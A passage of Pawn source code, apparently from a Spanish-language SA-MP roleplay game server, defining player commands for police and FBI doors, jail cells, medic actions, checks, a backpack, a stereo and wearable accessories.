				MoveDynamicObject(lspdg5, 250.8134765625, 86.482421875, 1005.7106323242, 1.0, -1000.0, -1000.0, -1000.0); 
			}else if (IsPlayerInRangeOfPoint(playerid, 5.0, 258.94287109375, 90.618301391602, 1001.330078125)){
				MoveDynamicObject(lspd2, 258.9423828125, 90.6181640625, 1004.3630371094, 1.0, -1000.0, -1000.0, -1000.0);
			}else if (IsPlayerInRangeOfPoint(playerid, 5.0, 779.43903, -361.14828, 994.32251)){
				MoveDynamicObject(lspd3, 770.61407, -361.15213, 994.32458, 1.0, -1000.0, -1000.0, -1000.0);
			}else if (IsPlayerInRangeOfPoint(playerid, 10.0, 757.9253, -390.6078, 1003.3300)){
        	    MoveDynamicObject(lspd1, 756.21741, -390.99985, 1003.55316, 3.5000);
       		}else{
			  Mensaje(playerid, COLOR_GRIS2, "No hay señal!");
            }
		}
		else if (Team_FBI(playerid))
		{
	    	if (IsPlayerInRangeOfPoint(playerid, 2.0, 228.7567, 150.5487, 1003.0234))
			{
				MoveDynamicObject(fbidoor2, 228.21276855, 154.31411743, 1002.02343750, 2.0, -1000.0, -1000.0, -1000.0);
				MoveDynamicObject(fbidoor1, 228.24699402, 148.20443726, 1002.02343750, 2.0, -1000.0, -1000.0, -1000.0);
				return 1;
			}
			else if (IsPlayerInRangeOfPoint(playerid, 2.0, 229.7680, 158.0882, 1003.0234)){
				MoveDynamicObject(fbidoor3, 230.44369507, 158.50949097, 998.89562988, 2.0, -1000.0, -1000.0, -1000.0);
				return 1;
			}
       		else
            {
			  Mensaje(playerid, COLOR_GRIS2, "No hay señal!");
			  return 1;
	        }
		} else Mensaje(playerid, COLOR_GRIS2, "Usted no tiene un mando a distancia para abrir esto.");
		return 1;
	}
	command(cp, playerid, params[])
	{
		if(Team_LSPD(playerid)){
			if(IsPlayerInRangeOfPoint(playerid, 3.0, 2041.135, -2073.297, 12.588)){
				MoveDynamicObject(PrisionRejas[0], 2041.135, -2073.297, 12.588, 1);
			}else if(IsPlayerInRangeOfPoint(playerid, 3.0, 2041.0068, -2070.6567, 12.5880)){
				MoveDynamicObject(PrisionRejas[1], 2041.0068, -2070.6567, 12.5880, 1);
			}else if(IsPlayerInRangeOfPoint(playerid, 3.0, 2011.776, -2047.918, 12.545)){
				MoveDynamicObject(PrisionRejas[2], 2011.776, -2047.918, 12.545, 1);
			}else if (IsPlayerInRangeOfPoint(playerid, 3.0, 308.0562, -1526.1218, 3266.0840)){
				MoveDynamicObject(PrisionRejas[3], 308.0562, -1526.1218, 3266.0840, 1);
				
			}else if (IsPlayerInRangeOfPoint(playerid, 3.0, 350.6404, 2043.4634, -15.8942)){
				MoveDynamicObject(lspdg5, 250.81405639648, 86.482467651367, 1003.235168457, 1.0, -1000.0, -1000.0, -1000.0);
				return 1;
			}
			else if (IsPlayerInRangeOfPoint(playerid, 5.0, 258.94287109375, 90.618301391602, 1001.330078125)){
				MoveDynamicObject(lspd2, 258.94287109375, 90.618301391602, 1001.330078125, 1.0, -1000.0, -1000.0, -1000.0);
				return 1;
			}
			else if (IsPlayerInRangeOfPoint(playerid, 5.0, 779.43903, -361.14828, 994.32251)){
				//MoveDynamicObject(cell, 266.3408203125, 82.641418457031, 1001.8412475586, 1.0, -1000.0, -1000.0, -1000.0);
				MoveDynamicObject(lspd3, 779.43903, -361.14828, 994.32251, 1.0, -1000.0, -1000.0, -1000.0);
				return 1;
			}
			else if (IsPlayerInRangeOfPoint(playerid, 10.0, 757.9253, -390.6078, 1003.3300)){ //245.0578, 72.4314, 1002.5406
			    MoveDynamicObject(lspd1, 757.79492, -391.00473, 1003.54712, 3.5000, -1000.0, -1000.0, -1000.0);
      			return 1;
       		}
       		else { Mensaje(playerid, COLOR_GRIS2, "No hay señal!"); }
		}
		else if (Team_FBI(playerid)){
			if (IsPlayerInRangeOfPoint(playerid, 2.0, 228.7567, 150.5487, 1003.0234)){
				MoveDynamicObject(fbidoor1, 228.26893616, 149.72817993, 1002.02343750, 2.0, -1000.0, -1000.0, -1000.0);
				MoveDynamicObject(fbidoor2, 228.20497131, 152.73513794, 1002.02343750, 2.0, -1000.0, -1000.0, -1000.0);
				return 1;
			}
			else if (IsPlayerInRangeOfPoint(playerid, 2.0, 229.7680, 158.0882, 1003.0234)){
				MoveDynamicObject(fbidoor3, 230.44369507, 158.50949097, 1001.94860840, 2.0, -1000.0, -1000.0, -1000.0);
				return 1;
			}
       		else { Mensaje(playerid, COLOR_GRIS2, "No hay señal!"); }
		}
		else Mensaje(playerid, COLOR_GRIS2, "Usted no tiene un mando a distancia para cerrar esto.");
		return 1;
    }
    command(controlcelda, playerid, params[])
    {
        if(IsPlayerInRangeOfPoint(playerid, 3.0, 196.9365, 164.5901, 1003.0234))
        {
			if(!Team_FBI(playerid))return Mensaje(playerid, COLOR_GRIS2, "No perteneces al equipo del FBI!");
            ShowPlayerDialog(playerid, CELDAS, DIALOG_STYLE_LIST, "{FFFFFF}FBI - Control de Celdas", " {FFFFFF}>Celda Nro 1 \n {FFFFFF}>Celda Nro 2", "Ok", "Salir");
        }
        else if(IsPlayerInRangeOfPoint(playerid, 15.0, 592.1495, 838.9785, -86.0390))
        {
           ShowPlayerDialog(playerid, CPRISION, DIALOG_STYLE_LIST, "{6CF600}Guardia Nacional{FFFFFF}-Control de Celdas", " {00FF00}>{FFFFFF}Celda Nro 1 \n {00FF00}>{FFFFFF}Celda Nro 2 \n {00FF00}>{FFFFFF}Celda Nro 3", "Ok", "Salir");
        }
        else Mensaje(playerid, COLOR_AMARILLO, "»{FFFFFF}No estás en el control de celdas!");
 		return 1;
	}
    command(sacarsangre, playerid, params[])
    {
        if(!sscanf(params, "u", params[0]))
        {
            if(!Team_SAMUR(playerid)) 	return Mensaje(playerid, COLOR_GRIS2, "No eres médico!");
            if(!booleano[OnDuty]{playerid})   return Mensaje(playerid, COLOR_GRIS2, "No estás de servicio!");
            if(IsPlayerConnected(params[0]))
            {
                if(IsPlayerInRangeOfPoint(playerid, 10.0, 2003.3566, 2288.7163, 1011.1256))
                {
                    if (dDistanciaJugador(5.0, playerid, params[0]))
            		{
            		    new Float:HP, string[128]; GetPlayerHealth(params[0], HP);
            		    if(HP < 100)return Mensaje(playerid, COLOR_GRIS2, "El paciente debe estar con el máximo de vida");
            		    SetHP(params[0], HP-80.0);
						SetPlayerDrunkLevel(params[0], 3000);
						Blood += 80;
						format(string, sizeof(string), "* El doctor %s realiza una extracción de sangre a %s", PlayerName(playerid), PlayerName(params[0]));
						ProxDetector(30.0, playerid, string, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA);
						format(string, sizeof(string), "{FF2200}Información{FFFFFF}: Hay %d centilitros de sangre disponible.", Blood);
						Mensaje(playerid, COLOR_BLANCO, string); 
            		}
            		else Mensaje(playerid, COLOR_GRIS2, "El jugador debe estar cerca de usted");
                }
                else Mensaje(playerid, COLOR_GRIS2, "No estás en el hospital!");
            }
            else Mensaje(playerid, COLOR_GRIS2, "Jugador no conectado");
        }
        else Mensaje(playerid, COLOR_GRIS2, "Utiliza: /sacarsangre <PlayerID>");
        return 1;
    }
	
command(rescatar, playerid, params[]){
	new player, Float:health, string[128];
	if(!sscanf(params, "u", player)){
		if(!Team_SAMUR(playerid))return Mensaje(playerid, COLOR_GRIS2, "No eres médico!");
		if(IsPlayerConnected(player)){
			if(dDistanciaJugador(4.0, playerid, player)){
				GetPlayerHealth(player, health);
				if(health < 15.1){
					booleano[Rescued]{player} = true;
					//Left4Life[player] = 240;
					SetHP(player, 35.0);
					ClearAnimations(player);
					format(string, sizeof(string), "* Médico %s reanima a %s que se encontraba inconsciente", PlayerName(playerid), PlayerName(player));
					ProxDetector(30.0, playerid, string, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA);
					format(string, sizeof(string), "{FF2200}Atención{FFFFFF}: %s está herido, si los servicios médicos no hacen nada en menos de 4 minutos, morirá.", PlayerName(player));
					Mensaje(player, COLOR_BLANCO, string);
					Mensaje(playerid, COLOR_BLANCO, string);
					ClearAnimations(player);
				}else return Mensaje(playerid, COLOR_GRIS2, "Este jugador tiene vida suficiente!");
			}else return Mensaje(playerid, COLOR_GRIS2, "El jugador debe estar cerca de usted");
		}else return Mensaje(playerid, COLOR_GRIS2, "Jugador no conectado");
	}else return Mensaje(playerid, COLOR_GRIS2, "Utiliza: /rescatar <id>");
	return 1;
}

    command(pcinfo, playerid, params[]){
        if(!Team_SAMUR(playerid))return Mensaje(playerid, COLOR_GRIS2, "No eres médico!");
        if(IsPlayerInRangeOfPoint(playerid, 5.0, -2670.3879, 519.9204, 48.0805)){
			new string[128];
        	ClearChatbox(playerid, 7);
	        Mensaje(playerid, 0x00D535FF, "Windows 7 (Loading ... )");
	        format(string, sizeof(string), "Sangre disponible: %d", Blood);
	        Mensaje(playerid, COLOR_BLANCO, string);
	        Mensaje(playerid, 0x00D535FF, "------------------------------");
		}
		else Mensaje(playerid, COLOR_GRIS2, "No estás en el ordenador!");
		return 1;
	}
        command(gmlimits, playerid, params[])
	{
	    if(IsPlayerConnected(playerid))
	    {
            new string[124];
	        format(string, sizeof(string), "%d Objects\n%d Pickups\n%d Checkpoints\n%d Race Checkpoints\n%d Map Icons\n%d 3D Text Labels", CountDynamicObjects(), CountDynamicPickups(), CountDynamicCPs(), CountDynamicRaceCPs(), CountDynamicMapIcons(), CountDynamic3DTextLabels());
	    	ShowPlayerDialog(playerid, DINFO, DIALOG_STYLE_MSGBOX, "SDC: Streamer Dynamics Counter", string, "Ok", "");
		}
		return 1;
	}
	command(comprarflores, playerid, params[]){
        if(obtenerDinero(playerid) > 9 && IsPlayerInRangeOfPoint(playerid, 5.0, 1416.3827, -1718.1904, 13.5469)){
		    darArma(playerid, 14, 1);
		    pierdeDinero(playerid, 9);
		}
		else Mensaje(playerid, COLOR_GRIS, "No tienes suficiente dinero o no te encuentras en una floristeria.");
		return 1;
    }
    command(patines, playerid, params[])
    {
        if(!Skate[playerid])return Mensaje(playerid, COLOR_GRIS, "No tienes patines!");
        if(!sscanf(params, "d", params[0]))
        {
			switch(params[0])
			{
			    case 0:
			    {
				  	return Skate[playerid] = 1;
			    }
			    case 1:
			    {
			        Skate[playerid] = 20; Mensaje(playerid, COLOR_GRIS2, "ACTIVADO ACCIÓN 2 --> Velocidad moderada");
			        return Mensaje(playerid, COLOR_AMARILLO2, "Utiliza: ESPACIO [correr] y ALT [parar] - Utilice /patines 0");
			    }
			    case 2:
			    {
			        Skate[playerid] = 30; Mensaje(playerid, COLOR_GRIS2, "ACTIVADO ACCIÓN 3 --> Sprint");
			        return Mensaje(playerid, COLOR_AMARILLO2, "Utiliza: ESPACIO [correr] y ALT [parar] - Utilice /patines 0");
			    }
			    default: Mensaje(playerid, COLOR_GRIS, "Utiliza: /patines [acción] (0:parar, 1:correr, 2:sprint)");
			}
        }
        else Mensaje(playerid, COLOR_GRIS, "Utiliza: /patines [acción] (0:parar, 1:correr, 2:sprint)");
        return 1;
    }
    command(atar, playerid, params[])
    {
        if(Rope[playerid] == 0)return Mensaje(playerid, COLOR_GRIS2, "No tienes una cuerda!");
        if(!sscanf(params, "u", params[0]))
        {
            if(IsPlayerConnected(params[0]))
            {
                if(dDistanciaJugador(4.0, playerid, params[0]))
                {
                    new string[128];
                    if(Tied[params[0]] == 0)
                    {
                        Tied[params[0]] = 1;
						format(string, sizeof(string), "* %s agarra una cuerda y ata a %s", PlayerName(playerid), PlayerName(params[0]));
						ProxDetector(20.0, playerid, string, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA);
					}
                    else
                    {
                        Tied[params[0]] = 0;
						format(string, sizeof(string), "* %s agarra una cuerda y desata a %s", PlayerName(playerid), PlayerName(params[0]));
						ProxDetector(20.0, playerid, string, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA);
						TogglePlayerControllable(params[0], 1);
                    }
                }
                else Mensaje(playerid, COLOR_GRIS2, "Jugador muy lejos.");
            }
            else Mensaje(playerid, COLOR_GRIS2, "Jugador desconectado.");
        }
        else Mensaje(playerid, COLOR_GRIS2, "Utiliza: /atar <ID>");
        return 1;
    }
    command(vendar, playerid, params[])
    {
            if(Rope[playerid] == 0)return Mensaje(playerid, COLOR_GRIS2, "No tienes venda!");
            if(!sscanf(params, "u", params[0]))
            {
                if(IsPlayerConnected(params[0]))
                {
                    if(dDistanciaJugador(4.0, playerid, params[0]))
                    {
                        new string[90];
                        if(Blinded[params[0]] == 0)
                        {
                            Blinded[params[0]] = 1;
							format(string, sizeof(string), "* %s venda los ojos de %s", PlayerName(playerid), PlayerName(params[0]));
							ProxDetector(20.0, playerid, string, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA);
							SetPlayerCameraPos(params[0], 0.0, 0.0, 1000);
							SetPlayerCameraLookAt(params[0], 0.0, 0.0, 5000);
                        }
                        else
                        {
                            Blinded[params[0]] = 0;
							format(string, sizeof(string), "* %s desvenda los ojos de %s", PlayerName(playerid), PlayerName(params[0]));
							ProxDetector(20.0, playerid, string, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA);
							SetCameraBehindPlayer(params[0]);
                        }
                    }
                    else Mensaje(playerid, COLOR_GRIS2, "Jugador muy lejos.");
                }
                else Mensaje(playerid, COLOR_GRIS2, "Jugador desconectado.");
            }
            else Mensaje(playerid, COLOR_GRIS2, "Utiliza: /vendar <ID>");
           return 1;
    }
	command(irpunto, playerid, params[])
	{
		new Float:x, Float:y, Float:z, string[100];
		if(cuenta[playerid][cAdministrador] < 2013)return Mensaje(playerid, COLOR_GRIS2, "No autorizado!");
		if(!booleano[AntiAbusos]{playerid}){Mensaje(playerid, COLOR_AMARILLO, "»{FFFFFF} No puedes usar este comando sin estar en OnDuty."); return 1;}
		if(sscanf(params, "fff", x, y, z))return Mensaje(playerid, COLOR_GRIS2, "Utiliza: /irpunto <X> <Y> <Z>");
		SetPlayerPos(playerid, x, y, z);
		format(string, sizeof(string), "Teleportado a %f, %f, %f", x, y, z);
		Mensaje(playerid, 0xFFFFFFFF, string);
		return 1;
	}
	
command(darcheque, playerid, params[]){
	new player, string[128];
	if(!sscanf(params, "ui", player, params[1])){
		if(player == playerid)return Mensaje(playerid, COLOR_GRIS2, "No puedes darte un cheque a ti mismo!");
		if(params[1] > cuenta[playerid][cDineroBanco])return Mensaje(playerid, COLOR_GRIS2, "No puedes sobregirar un cheque.");
		if(params[1] < 1 || params[1] < 0)return Mensaje(playerid, COLOR_GRIS2, "Como vas a dar cheque en negativo");
		if(params[1] < 1 || params[1] > 300000)return Mensaje(playerid, COLOR_GRIS2, "No puedes dar un cheque con mas dinero");
		if(booleano[AdminDuty]{player})return Mensaje(playerid, COLOR_ROJO, "Administrador en Servicio.");
		if(IsPlayerConnected(player)){
			if(dDistanciaJugador(5.0, playerid, player)){
				cuenta[playerid][cDineroBanco] -= params[1];
				cuenta[player][cCheques] += params[1];
				format(string, sizeof(string), "* %s saca su chequera, firma un cheque y se lo da a %s", PlayerName(playerid), PlayerName(player));
				ProxDetector(20.0, playerid, string, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA);
				format(string, sizeof(string), "* Has dado un cheque por %d$ a %s.", params[1], PlayerName(player));
				Mensaje(playerid, COLOR_GRAD4, string);
				format(string, sizeof(string), "* Has recibido un cheque por %d$ de %s.", params[1], PlayerName(playerid));
				Mensaje(player, COLOR_GRAD4, string);
			}else return Mensaje(playerid, COLOR_GRIS2, "Jugador muy lejos.");
		}else return Mensaje(playerid, COLOR_GRIS2, "Jugador no conectado.");
	}else return Mensaje(playerid, COLOR_GRIS2, "Utiliza: /darcheque <PlayerID> <Cantidad>");
	return 1;
}
    command(cobrarcheques, playerid, params[]){
        new string[128], bizztill, total;
        if(!IsPlayerInRangeOfPoint(playerid, 30.0, 1305.1010, -976.4108, 39.1699))return Mensaje(playerid, COLOR_GRIS2, "No estás en el banco.");
		if(cuenta[playerid][cCheques] == 0)return Mensaje(playerid, COLOR_GRIS2, "No tienes ningun cheque para cobrar!");
		bizztill = cuenta[playerid][cCheques] / 100;
		total = cuenta[playerid][cCheques]-bizztill;
		cuenta[playerid][cDineroBanco] += total;
		format(string, sizeof(string), "* Has cobrado tus cheques, un valor de %d$ fueron añadidos a tu cuenta bancaria.", cuenta[playerid][cCheques]);
		Mensaje(playerid, COLOR_GRIS3, string);
		cuenta[playerid][cCheques] = 0;
		return 1;
  	}
  	command(vercheques, playerid, params[]){
		new string[128];
  		format(string, sizeof(string), "* Los cheques que has recibido suman un total de %d$", cuenta[playerid][cCheques]);
  		Mensaje(playerid, COLOR_GRIS2, string);
  		return 1;
	}
	command(ipod, playerid, params[])
	{
	    if(cuenta[playerid][cIpod] == 0)return Mensaje(playerid, COLOR_AMARILLO, "»{FFFFFF} No tienes un IPOD, cómpra uno en el 24/7.");
		ShowPlayerDialog(playerid, IPOD_MENU, DIALOG_STYLE_LIST, "IPOD Menú", "MP3\nRadio\nApagar", "Aceptar", "Salir");
		return 1;
	}
command(flist, playerid, params[]){
	new member = cuenta[playerid][cMiembro];
	new leader = cuenta[playerid][cLider];
        new teamnumber;
		if (cuenta[playerid][cLider] != 0) teamnumber = cuenta[playerid][cLider];
		else if (cuenta[playerid][cMiembro] != 0) teamnumber = cuenta[playerid][cMiembro];
        if(member > 0 || leader > 0)
        {
            Mensaje(playerid, COLOR_VERDE, "- Miembros activos -");
   for(new i=0, _max=GetMaxPlayers();i<_max;i++)
			{
			    new string[32];
				if (IsPlayerConnected(i))
				{
					if (cuenta[i][cLider] == teamnumber) format(string, sizeof(string), "%s (LÍDER)", PlayerName(i));
					else if (cuenta[i][cMiembro] == teamnumber) format(string, sizeof(string), "%s, Rank %d", PlayerName(i), cuenta[i][cRango]);
					if(strlen(string) > 0) Mensaje(playerid, COLOR_GRIS2, string);
				}
			}
		} else Mensaje(playerid, COLOR_GRIS2, "No perteneces a ninguna facción.");
        return 1;
    }
    command(miembros, playerid, params[])
    {
        return cmd_flist(playerid, params);
    }
	
command(mochila, playerid, params[]){
	if(booleano[ReduceTime]{playerid})return Mensaje(playerid, COLOR_AMARILLO, "»{FFFFFF} Este comando se utiliza cada 3 segundos.");
	if(cuenta[playerid][cMochila] == 0)return Mensaje(playerid, COLOR_AMARILLO, "»{FFFFFF} No tienes una mochila. Cómprala en un 24-7.");
	else{
		if(!sscanf(params, "s[32]", params[0])){
			new string[128], gunID = GetPlayerWeapon(playerid), gunAmmo = GetPlayerAmmo(playerid), gunname[32];
			if(!strcmp(params[0], "garma")){
			if(gunID != 0 && gunAmmo != 0){
				if(Mochila[playerid][0] == 0 || Mochila[playerid][1] == 0){
					booleano[ReduceTime]{playerid} = true;
					SetTimerEx("ReduceTimer", 3000, false, "i", playerid);
					Mochila[playerid][0] = gunID;
					Mochila[playerid][1] = gunAmmo;
					RemovePlayerWeapon(playerid, Mochila[playerid][0]);
					GetWeaponName(gunID, gunname, sizeof(gunname));
					format(string, sizeof(string), "* %s guarda una %s en su mochila.", PlayerName(playerid), gunname);
					ProxDetector(30.0, playerid, string, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA);
					SetPlayerAttachedObject(playerid, 1, 371, 1, 0.0000, -0.0954, -0.0012, 359.8081, 89.4325, 358.1167);
					Att_Obj_Slot_1[playerid] = "Mochila";
				}else Mensaje(playerid, COLOR_GRIS, "Ya tienes un arma guardada.");
			}else Mensaje(playerid, COLOR_GRIS, "No tienes ningún arma para guardar.");
		}else if(strcmp(params[0], "sarma", true) == 0){
            	    if(Mochila[playerid][0] != 0 && Mochila[playerid][1] != 0)
		            {
		                booleano[ReduceTime]{playerid} = true;
		                SetTimerEx("ReduceTimer", 3000, false, "i", playerid);
		                GetWeaponName(Mochila[playerid][0], gunname, sizeof(gunname));
		                darArma(playerid, Mochila[playerid][0], Mochila[playerid][1]);
		      			format(string, sizeof(string), "* %s saca una %s de su mochila.", PlayerName(playerid), gunname);
						ProxDetector(30.0, playerid, string, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA);
		      			Mochila[playerid][0] = 0;
		      			Mochila[playerid][1] = 0;
		      			if(strcmp(Att_Obj_Slot_1[playerid], "Mochila", true) == 0)
		      			{
		      			    RemovePlayerAttachedObject(playerid, 1);
							Att_Obj_Slot_1[playerid] = "Vacio";
		      			}
		            }
		            else Mensaje(playerid, COLOR_GRIS, "No tienes ningún arma guardada en tu mochila.");
            	}
            	else if(strcmp(params[0], "agarrar", true) == 0)
           		{
       		    	SetPlayerAttachedObject(playerid, 1, 371, 1, 0.0000, -0.0954, -0.0012, 359.8081, 89.4325, 358.1167);
					Att_Obj_Slot_1[playerid] = "Mochila";
            	    format(string, sizeof(string), "* %s agarra su mochila.", PlayerName(playerid));
					ProxDetector(30.0, playerid, string, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA);
    			}
            	else Mensaje(playerid, COLOR_GRIS, "Item incorrecto.");
            }
            else Mensaje(playerid, COLOR_GRIS, "Utiliza: /mochila <nombre> (garma, sarma, agarrar)");
        }
        return 1;
    }

CMD:colocarstereo(playerid, params[])
{
    new string[128], Float:BBCoord[4];
    GetPlayerPos(playerid, BBCoord[0], BBCoord[1], BBCoord[2]);
    GetPlayerFacingAngle(playerid, BBCoord[3]);
    SetPVarFloat(playerid, "BBX", BBCoord[0]);
    SetPVarFloat(playerid, "BBY", BBCoord[1]);
    SetPVarFloat(playerid, "BBZ", BBCoord[2]);
    BBCoord[0] += (2 * floatsin(-BBCoord[3], degrees));
   	BBCoord[1] += (2 * floatcos(-BBCoord[3], degrees));
   	BBCoord[2] -= 1.0;
	if(!cuenta[playerid][cEstereo])return Mensaje(playerid, COLOR_AMARILLO, "»{FFFFFF} Usted no posee un stereo."); // Part of Variable
	if(GetPVarInt(playerid, "PlacedBB"))return Mensaje(playerid, COLOR_AMARILLO, "»{FFFFFF} Usted ya tiene un stereo, utilice /panel para más información.");
	for(new i=0, _max=GetMaxPlayers();i<_max;i++)
	{
 		if(GetPVarType(i, "PlacedBB"))
   		{
  			if(IsPlayerInRangeOfPoint(playerid, 30.0, GetPVarFloat(i, "BBX"), GetPVarFloat(i, "BBY"), GetPVarFloat(i, "BBZ")))
			{
   				Mensaje(playerid, COLOR_AMARILLO, "»{FFFFFF} Ya hay un usuario en esta sinfonía.");
			    return 1;
			}
		}
	}
	new string2[128];
	format(string2, sizeof(string2), "%s se agachó, seguidamente colocó su stereo en el suelo.", PlayerName(playerid));
    ProxDetector(30.0, playerid, string, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA);
	SetPVarInt(playerid, "PlacedBB", CreateDynamicObject(2226, BBCoord[0], BBCoord[1], BBCoord[2], 0.0, 0.0, 0.0, .worldid = GetPlayerVirtualWorld(playerid), .interiorid = GetPlayerInterior(playerid)));
	format(string, sizeof(string), "Dueño Stereo: %s\nUsa /stereoprender para encenderlo\n/recogerstereo para recogerlo.", PlayerName(playerid));
	SetPVarInt(playerid, "BBLabel", _:CreateDynamic3DTextLabel(string, -1, BBCoord[0], BBCoord[1], BBCoord[2]+0.6, 5, .worldid = GetPlayerVirtualWorld(playerid), .interiorid = GetPlayerInterior(playerid)));
	SetPVarInt(playerid, "BBArea", CreateDynamicSphere(BBCoord[0], BBCoord[1], BBCoord[2], 30.0, GetPlayerVirtualWorld(playerid), GetPlayerInterior(playerid)));
	SetPVarInt(playerid, "BBInt", GetPlayerInterior(playerid));
	SetPVarInt(playerid, "BBVW", GetPlayerVirtualWorld(playerid));
	ApplyAnimation(playerid, "BOMBER", "BOM_Plant", 4.0, 0, 0, 0, 0, 0);
    ApplyAnimation(playerid, "BOMBER", "BOM_Plant", 4.0, 0, 0, 0, 0, 0);
	return 1;
}

CMD:stereoprender(playerid, params[])
{
    if(cuenta[playerid][cEstereo] == 0)return Mensaje(playerid, COLOR_AMARILLO, "»{FFFFFF} Usted no posee un stereo.");
	if(GetPVarType(playerid, "PlacedBB"))
	{
		if(IsPlayerInRangeOfPoint(playerid, 3.0, GetPVarFloat(playerid, "BBX"), GetPVarFloat(playerid, "BBY"), GetPVarFloat(playerid, "BBZ")))
		{
			ShowPlayerDialog(playerid, DIALOG_BOOMBOX, DIALOG_STYLE_LIST, "{32A9F5}Sistema Stereo", "» Jazz\n» Pop\n» Rap\n» R&B and Urban\n» Rock\n» Country\n» Vía URL\n» Apagar Stereo", "Aceptar", "Cancelar");
		}
		else
		{
   			return Mensaje(playerid, COLOR_AMARILLO, "»{FFFFFF} Usted no está cerca de su stereo.");
		}
    }
    else
    {
        Mensaje(playerid, COLOR_AMARILLO, "»{FFFFFF} Usted no ha puesto su stereo en el piso.");
	}
	return 1;
}

CMD:recogerstereo(playerid, params [])
{
    if(cuenta[playerid][cEstereo] == 0)return Mensaje(playerid, COLOR_AMARILLO, "»{FFFFFF} Usted no posee un stereo.");
	if(!GetPVarInt(playerid, "PlacedBB"))
    {
        Mensaje(playerid, COLOR_AMARILLO, "»{FFFFFF} No has colocado ningún stereo en el suelo.");
    }
	if(IsPlayerInRangeOfPoint(playerid, 3.0, GetPVarFloat(playerid, "BBX"), GetPVarFloat(playerid, "BBY"), GetPVarFloat(playerid, "BBZ")))
    {
        PickUcEstereo(playerid);
        Mensaje(playerid, COLOR_AMARILLO, "»{FFFFFF} Recogiste tu Stereo.");
    }
    return 1;
}
    command(maleta, playerid, params[])
    {
        if(cuenta[playerid][cMaleta] == 0)return Mensaje(playerid, COLOR_AMARILLO, "»{FFFFFF} No tienes una maleta.");
        new string[64];
		SetPlayerAttachedObject(playerid, 0, 1210, 6, 0.289999, 0.079999, -0.000000, 0.000000, -100.000000, 1.000000);
		Att_Obj_Slot_1[playerid] = "Maleta";
	 	format(string, sizeof(string), "* %s agarra su maletín.", PlayerName(playerid));
		ProxDetector(30.0, playerid, string, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA);
		return Mensaje(playerid, COLOR_GRIS2, "Utiliza /qobjeto para quitar el objeto!");
    }
    command(gafas, playerid, params[]){
        if(cuenta[playerid][cGafas] == 0)return Mensaje(playerid, COLOR_GRIS1, " No tienes gafas.");
        new string[64];
        if(!booleano[UsingRayBan]{playerid}){
            SetPlayerAttachedObject( playerid, 3, 19022, 18, -0.008390, -0.110742, -0.001029, 88.036231, 353.353454, 1.575388, 0.826243, 1.000000, 1.012219 );
	    	Att_Obj_Slot_3[playerid] = "Gafas";
			format(string, sizeof(string), "* %s se pone sus gafas de sol.", PlayerName(playerid));
			ProxDetector(30.0, playerid, string, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA);
	  		ApplyAnimation(playerid, "RIOT", "RIOT_shout", 2.0, 0, 0, 0, 0, 0);
	    	TextDrawBoxColor(SunGlasses, 0x00000040);
	     	TextDrawShowForPlayer(playerid, SunGlasses);
	     	booleano[UsingRayBan]{playerid} = true;
        }else{
            RemovePlayerAttachedObject(playerid, 3);
	      	Att_Obj_Slot_3[playerid] = "Vacío";
		    format(string, sizeof(string), "* %s se quita sus gafas de sol.", PlayerName(playerid));
			ProxDetector(30.0, playerid, string, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA);
	  		TextDrawHideForPlayer(playerid, SunGlasses);
	    	ApplyAnimation(playerid, "RIOT", "RIOT_shout", 2.0, 0, 0, 0, 0, 0);
	        booleano[UsingRayBan]{playerid} = false;
        }
        return 1;
    }
    command(casco, playerid, params[])
    {
        if(cuenta[playerid][cCasco] == 0)return Mensaje(playerid, COLOR_GRIS2, "No tienes casco!");
        new string[48];
		format(string, sizeof(string), "* %s se coloca su casco.", PlayerName(playerid));
	 	ProxDetector(30.0, playerid, string, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA);
	 	SetPlayerAttachedObject( playerid, 2, 18645, 2, 0.054665, 0.019579, -0.002646, 24.949916, 96.733367, 68.246139, 1.016691, 1.000000, 1.094870 );
	 	Att_Obj_Slot_2[playerid] = "Casco";
	 	return Mensaje(playerid, COLOR_GRIS2, "Utiliza /qcasco para quitarte el casco");
    }
    command(qcasco, playerid, params[])
    {
        if(cuenta[playerid][cCasco] == 0)return Mensaje(playerid, COLOR_GRIS2, "No tienes casco!");
        new string[48];
		format(string, sizeof(string), "* %s se saca su casco.", PlayerName(playerid));
	 	ProxDetector(30.0, playerid, string, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA);
	 	RemovePlayerAttachedObject(playerid, 2);
	 	return Att_Obj_Slot_2[playerid] = "Vacío";
    }
    command(brillo, playerid, params[])
    {
        if(!booleano[UsingRayBan]{playerid})return Mensaje(playerid, COLOR_GRIS2, "No tienes las gafas puestas. (/gafas)");
		else ShowPlayerDialog(playerid, BRILLO_GAFAS, DIALOG_STYLE_INPUT, "Sistema de Gafas", "Porfavor elije el brillo de tus gafas\nLuminoso\nNormal\nOscuro\nMuyOscuro", "Ok", "Cancel");
        return 1;
    }
    command(qobjeto, playerid, params[])
    {
        new string[64];
		if(!sscanf(params, "d", params[0]))
        {
			switch(params[0])
			{
			    case 0:
			    {
			        RemovePlayerAttachedObject(playerid, 0);
